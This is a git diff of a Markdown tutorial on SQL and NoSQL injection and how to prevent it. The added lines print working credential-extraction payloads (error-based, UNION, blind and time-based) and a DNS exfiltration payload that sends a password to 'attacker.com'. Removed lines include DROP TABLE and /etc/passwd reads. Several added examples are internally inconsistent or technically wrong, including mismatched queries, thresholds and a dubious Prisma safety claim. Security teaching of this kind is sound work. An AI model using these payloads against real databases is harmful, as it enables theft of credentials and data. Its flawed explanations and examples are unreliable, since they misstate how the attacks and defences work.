@@ -19,30 +19,50 @@ SQL Injection is a web security vulnerability that allows attackers to interfere
 -   Authentication bypass
 -   Command execution
 
+It has been ranked as the number one risk on the [OWASP Top 10](https://owasp.org/www-project-top-ten/) list since 2010, just moved to 3rd position in 2021.
+
+OWASP Top 10 is a list of the 10 most critical security risks to web applications. It is updated every 3-4 years by a team of security experts from around the world.
+
 ## Types of SQL Injection
 
 ### 1. In-band SQLi (Classic)
 
-Direct retrieval of data through the same channel used to inject the SQL code.
-
+Direct retrieval of data through the same channel used to inject the SQL code. The attack and data extraction happen through the same endpoint.
 #### Error-based
 
 ```sql
 -- Vulnerable query
-SELECT * FROM users WHERE username = 'admin' AND password = ''' -- Causes error
+SELECT title, content FROM articles WHERE id = '$id' AND user_id = '$user_id'
 
 -- Attack payload
-admin' OR '1'='1
+"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(username,':',password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--"
+
+-- Final query
+SELECT title, content FROM articles WHERE id = '1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(username,':',password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)-- AND user_id = '1'
+
+-- Causes error like:
+"Duplicate entry 'admin:password123' for key 'group_key'"
 ```
 
 #### Union-based
 
 ```sql
 -- Vulnerable query
-SELECT title, content FROM articles WHERE id = '1'
+SELECT title, content FROM articles WHERE id = '$id' AND user_id = '$user_id'
 
 -- Attack payload
-1 UNION SELECT username, password FROM users--
+"1 UNION SELECT username, password FROM users--"
+
+-- Final query
+SELECT title, content FROM articles WHERE id = '1' UNION SELECT username, password FROM users-- AND user_id = '$user_id'
+
+-- Returns:
+[
+  {"title": "Article 1", "content": "Content 1"},
+  {"title": "Article 2", "content": "Content 2"},
+  {"title": "admin", "content": "password123"},
+  {"title": "user1", "content": "secret456"}
+]
 ```
 
 ### 2. Blind SQLi
@@ -56,15 +76,63 @@ When results are not directly visible to the attacker.
 SELECT * FROM users WHERE username = '$username' AND password = '$password'
 
 -- Attack payload
-admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50--
+"admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50--"
+
+-- Final query
+SELECT * FROM users WHERE username = 'admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50-- AND password = '$password'
+
+-- Final query becomes
+SELECT * FROM users WHERE username = 'admin' AND (true_or_false)-- AND password = '$password'
+
+-- Returns admin's record if the condition is true
 ```
 
 #### Time-based
 
 ```sql
 -- Attack payload
-admin' AND IF(ASCII(SUBSTRING(password,1,1))>50, SLEEP(5), 0)--
+"admin' AND IF(ASCII(SUBSTRING(password,1,1))>50, SLEEP(5), IF(ASCII(SUBSTRING(password,1,1))>60, SLEEP(3), SLEEP(1))--"
+
+-- Final query
+SELECT * FROM users WHERE username = 'admin' AND IF(ASCII(SUBSTRING(password,1,1))>50, SLEEP(5), IF(ASCII(SUBSTRING(password,1,1))>60, SLEEP(3), SLEEP(1))-- AND password = '$password'
+
+-- Nested If
+
+IF(
+    ASCII(SUBSTRING(password,1,1))>90, 
+    SLEEP(5), 
+    IF(ASCII(SUBSTRING(password,1,1))>60, 
+        SLEEP(3), 
+        SLEEP(1)
+    )
+)
+
+-- based on the time taken to respond, attacker can infer the password
 ```
+
+### 3. Out-of-band SQLi
+
+When the attacker is unable to see the result of the SQL query in the application's response. The attacker uses an out-of-band channel to retrieve data.
+
+#### DNS-based
+
+```sql
+-- Vulnerable query
+SELECT * FROM products WHERE id = '$id'
+
+-- Attack payload
+"admin' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com')))--"
+
+-- Final query
+SELECT * FROM users WHERE username = 'admin' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com')))-- AND password = '$password'
+
+-- CONCAT('\\\\', 'secret123', '.attacker.com')
+
+-- SELECT LOAD_FILE('\\\\secret123.attacker.com')
+
+-- The attacker can monitor DNS requests to 'attacker.com' to retrieve the password
+```
+
 
 ## Prevention Techniques
 
@@ -77,20 +145,46 @@ const query = `SELECT * FROM users WHERE username = '${username}'`
 // Safe
 const query = 'SELECT * FROM users WHERE username = ?'
 db.query(query, [username])
+//Query structure is fixed
+//Parameters treated as literals, not code
+//Special characters escaped automatically
+
+// Attack payload
+"admin' OR '1'='1"
+
+// Final query
+SELECT * FROM users WHERE username = 'admin'' OR ''1''=''1'
 ```
 
 ### 2. Input Validation
 
 ```javascript
-function validateInput(input) {
-    // Remove dangerous characters
-    return input.replace(/[;'"\\]/g, '')
-}
-
 // Whitelist validation
 function isValidUsername(username) {
     return /^[a-zA-Z0-9_]{3,20}$/.test(username)
 }
+
+// Test invalid inputs
+const invalidUsernames = [
+    // Too short (< 3 chars)
+    "",
+
+    // Too long (> 20 chars)
+    "very_long_username_12345",
+    
+    // Invalid characters,
+    "user'name",
+    "user;name",
+    
+    // Special characters
+    "españa123",
+    "user🔥name",
+    
+    // SQL injection attempts
+    "admin'--",
+    "admin/**/",
+    "admin;--",
+];
 ```
 
 ### 3. Escaping Special Characters
@@ -104,75 +198,17 @@ function escapeSQL(unsafe) {
         .replace(/\n/g, '\\n')
         .replace(/\r/g, '\\r')
         .replace(/"/g, '\\"')
+        .replace(/--/g, '\\-\\-')
 }
-```
 
-## Parameterized Queries
-
-### Node.js with MySQL
-
-```javascript
-// Using prepared statements
-const mysql = require('mysql2')
-
-async function safeQuery(username, password) {
-    const query = 'SELECT * FROM users WHERE username = ? AND password = ?'
-    const [rows] = await pool.execute(query, [username, password])
-    return rows
-}
-```
-
-### Node.js with PostgreSQL
-
-```javascript
-const { Pool } = require('pg')
-
-async function safeQuery(username) {
-    const query = {
-        text: 'SELECT * FROM users WHERE username = $1',
-        values: [username],
-    }
-    const result = await pool.query(query)
-    return result.rows
-}
-```
-
-### Node.js with SQLite
-
-```javascript
-const sqlite3 = require('sqlite3')
-
-function safeQuery(username, callback) {
-    const query = 'SELECT * FROM users WHERE username = ?'
-    db.get(query, [username], callback)
-}
+// "end--" becomes "end\-\-" to prevent comment injection
 ```
 
 ## ORM Security
 
-### Sequelize Example
+An ORM is a programming technique that lets developers work with databases using object-oriented programming concepts, instead of writing raw SQL queries. 
 
-```javascript
-// Safe by default
-const user = await User.findOne({
-    where: {
-        username: username,
-        password: password,
-    },
-})
-
-// Unsafe raw query
-const users = await sequelize.query(
-    `SELECT * FROM users WHERE username = '${username}'` // Dangerous!
-)
-
-// Safe raw query
-const users = await sequelize.query('SELECT * FROM users WHERE username = ?', {
-    replacements: [username],
-    type: sequelize.QueryTypes.SELECT,
-})
-```
-
+Instead of writing database queries directly, you work with objects in your programming language. The ORM handles the conversion between your objects and database tables automatically.
 ### Prisma Example
 
 ```javascript
@@ -183,9 +219,15 @@ const user = await prisma.user.findUnique({
     },
 })
 
-// Even raw queries are safe
+// Safe raw queries
+// Converts to prepared statements internally
 const result = await prisma.$queryRaw`
     SELECT * FROM users WHERE username = ${username}
+`
+
+// Unsafe raw queries
+const result = await prisma.$queryRaw`
+    SELECT * FROM users WHERE username = '${username}'
 `
 ```
 
@@ -202,7 +244,7 @@ const dbConfig = {
     // Limit permissions
     allowedCommands: ['SELECT', 'INSERT', 'UPDATE'],
     // Restrict database access
-    host: 'localhost',
+    host: 'api.myapp.com',
     // Use connection pooling
     connectionLimit: 10,
 }
@@ -211,7 +253,6 @@ const dbConfig = {
 ### 2. Query Construction
 
 -   Use parameterized queries
--   Avoid dynamic table names
 -   Validate and sanitize all inputs
 -   Use ORMs when possible
 
@@ -228,168 +269,4 @@ app.use((err, req, res, next) => {
         next(err)
     }
 })
-```
-
-### 4. Security Headers
-
-```javascript
-app.use((req, res, next) => {
-    // Prevent clickjacking
-    res.setHeader('X-Frame-Options', 'DENY')
-    // Prevent MIME type sniffing
-    res.setHeader('X-Content-Type-Options', 'nosniff')
-    next()
-})
-```
-
-## Demo Instructions
-
-The accompanying `index.html` and `server.js` files demonstrate:
-
-1. SQL Injection vulnerability in login form
-2. SQL Injection in search functionality
-3. Parameterized queries implementation
-4. Input validation and sanitization
-5. Error handling best practices
-
-Check the demo files to see these security concepts in action.
-
-## NoSQL Injection
-
-### MongoDB Injection Examples
-
-#### 1. Authentication Bypass
-
-```javascript
-// Vulnerable query
-const user = await User.findOne({
-    username: username,
-    password: password
-});
-
-// Attack payload
-username: admin
-password[$ne]: null
-```
-
-#### 2. Query Operator Injection
-
-```javascript
-// Vulnerable query
-const users = await User.find({
-    role: userInput
-});
-
-// Attack payload
-role[$regex]: admin.*
-```
-
-#### 3. JavaScript Evaluation
-
-```javascript
-// Vulnerable query using $where
-const users = await User.find({
-    $where: `this.balance > ${amount}`,
-})
-
-// Attack payload
-amount: '0; sleep(5000)'
-```
-
-### Prevention Techniques for NoSQL
-
-#### 1. Type Checking
-
-```javascript
-// Safe query construction
-const query = {
-    username: String(username),
-    age: Number(age),
-}
-```
-
-#### 2. Schema Validation
-
-```javascript
-const userSchema = new mongoose.Schema({
-    username: {
-        type: String,
-        validate: {
-            validator: function (v) {
-                return /^[a-zA-Z0-9_]{3,20}$/.test(v)
-            },
-        },
-    },
-})
-```
-
-#### 3. Query Sanitization
-
-```javascript
-function sanitizeMongoQuery(obj) {
-    const clean = {}
-    for (let key in obj) {
-        if (typeof obj[key] === 'object') {
-            if (key[0] === '$') continue // Skip operator injection
-            clean[key] = sanitizeMongoQuery(obj[key])
-        } else {
-            clean[key] = obj[key]
-        }
-    }
-    return clean
-}
-```
-
-## Advanced Attack Scenarios
-
-### 1. Query Stacking
-
-Multiple queries executed in one statement.
-
-```sql
--- Vulnerable query
-const query = `SELECT * FROM users WHERE id = ${id}`;
-
--- Attack payload
-1; DROP TABLE users; --
-```
-
-Prevention:
-
-```javascript
-// Most databases don't allow multiple queries in prepared statements
-const query = 'SELECT * FROM users WHERE id = ?'
-db.query(query, [id])
-```
-
-### 2. Data Exfiltration
-
-Extracting data through different channels.
-
-```sql
--- Attack using UNION
-1 UNION SELECT creditcard_num,email FROM users--
-
--- Attack using conditional responses
-' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
-
--- Attack using out-of-band channels
-' UNION SELECT null,load_file('/etc/passwd')--
-```
-
-Prevention:
-
-```javascript
-// 1. Column type checking
-const schema = {
-    id: { type: 'number', min: 1 },
-    name: { type: 'string', maxLength: 50 },
-}
-
-// 2. Result set validation
-function validateResults(rows) {
-    return rows.every(
-        row => typeof row.id === 'number' && typeof row.name === 'string'
-    )
-}
 ```
